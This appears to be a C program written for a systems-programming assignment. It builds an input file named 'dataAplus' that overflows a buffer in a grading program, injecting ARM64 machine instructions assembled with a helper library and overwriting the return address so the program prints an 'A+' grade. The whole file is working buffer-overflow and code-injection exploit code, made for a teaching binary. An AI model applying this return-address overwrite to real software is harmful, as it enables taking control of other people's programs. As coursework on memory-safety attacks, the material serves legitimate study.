#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "miniassembler.h"

int main(void)
{
    const char* name = "Eesh";
    /* Need to change return address */
    unsigned long ulReturnAddress = 0x42005C;

    /* grade = A */
    /* Begins at x */
    unsigned int uiMovInstr1 = MiniAssembler_mov(1, 0x41); /* 4-7 */
    unsigned int uiAdrInstr1 = MiniAssembler_adr(2, 0x420044, 0x420064); /* 8-11 */
    unsigned int uiStrbInstr1 = MiniAssembler_strb(1, 2); /* 12-15 */
    
    /* printf("%c is your grade.\n", grade); */
    /* adrp	x0, 0x400000 */
    unsigned int uiAdrpInstr1 = MiniAssembler_adrp(0, 0x400000, 0x420072); /* 16-19 */
    /* add	x0, x0, #0x960 */
    unsigned int uiAddInstr1 = MiniAssembler_add(0, 0, 0x960); /* 20-23 */
    /* adrp	x1, 0x420000 */
    unsigned int uiAdrpInstr2 = MiniAssembler_adrp(1, 0x420000, 0x420080); /* 24-27 */
    /* ldrb	w1, [x1,#68] */ 
    unsigned int uiLdrbInstr1 = MiniAssembler_ldrb(1, 1, 68); /* 28-31 */
    /* bl	0x400600 <printf@plt> */
    unsigned int uiBlInstr1 = MiniAssembler_bl(0x400600, 0x42008E); /* 32-35 */
    
    /* printf('+'); */
    /* mov w0, '+' */
    unsigned int uiMovInstr2 = MiniAssembler_mov(0, 0x002B); /* 36-39 */
    /* bl	0x400600 <printf@plt> */
    unsigned int uiBlInstr2 = MiniAssembler_bl(0x400600, 0x42009C); /* 40-43 */

    /* branch to // printf("Thank you, %s.\n", name) */
    unsigned int uiBInstr = MiniAssembler_b(0x400878, 0x4200A0); /* 44-47 */


    FILE *psFile;

    psFile = fopen("dataAplus", "w");

    /* Printing out 4-character long name. */
    /* 0->3 */
    fprintf(psFile, "%s", name);

    /* 4->7 */
    fwrite(&uiMovInstr1, sizeof(unsigned int), 1, psFile);
    /* 8->11 */
    fwrite(&uiAdrInstr1, sizeof(unsigned int), 1, psFile);
    /* 12->15 */
    fwrite(&uiStrbInstr1, sizeof(unsigned int), 1, psFile);
    /* 16->19 */
    fwrite(&uiAdrpInstr1, sizeof(unsigned int), 1, psFile);
    /* 20->23 */
    fwrite(&uiAddInstr1, sizeof(unsigned int), 1, psFile);
    /* 24->27 */
    fwrite(&uiAdrpInstr2, sizeof(unsigned int), 1, psFile);
    /* 28->31 */
    fwrite(&uiLdrbInstr1, sizeof(unsigned int), 1, psFile);
    /* 32->35 */
    fwrite(&uiBlInstr1, sizeof(unsigned int), 1, psFile);
    /* 36->39 */
    fwrite(&uiMovInstr2, sizeof(unsigned int), 1, psFile);
    /* 40->43 */
    fwrite(&uiBlInstr2, sizeof(unsigned int), 1, psFile);
    /* 44->47 */
    fwrite(&uiBInstr, sizeof(unsigned int), 1, psFile);

    fwrite(&ulReturnAddress, sizeof(unsigned long), 1, psFile);

    fclose(psFile);

    return 1;
}

